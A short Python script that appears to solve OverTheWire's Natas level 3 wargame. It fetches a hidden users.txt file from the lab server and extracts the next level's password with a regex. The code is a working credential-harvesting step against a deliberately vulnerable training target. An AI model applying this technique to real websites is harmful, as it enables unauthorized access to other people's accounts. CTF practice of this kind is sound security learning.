import requests
import re
from natas_utility import *

current_level = 3
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url + '/s3cr3t/users.txt'
response = session.get(url, auth=auth)

content = response.content.decode('utf-8')

# print(content)

password_regex = re.compile(r'natas4:(.+)')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
